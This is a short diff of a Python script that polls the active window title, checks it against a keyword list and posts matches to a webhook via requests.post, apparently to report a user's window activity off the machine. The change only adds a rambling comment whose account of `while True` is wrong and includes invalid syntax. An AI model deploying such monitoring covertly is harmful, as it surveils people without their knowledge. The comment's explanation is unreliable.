@@ -44,7 +44,7 @@ def send(keyword):
     }
     requests.post(hook, json=payload)
 
-while True:
+while True: # creates a loop how it works: while true does something while something is equal to true but it will always be equal to true as there was no variable before it so if there was a varaible NotTrue = False and you did while NotTrue = True: it wouldnt work.
     activewindow = wintitle() # makes a variable active window and says its = to the function wintitle
     found = False # found is a variavle at false but sent to true later.
     for keyword in messages:
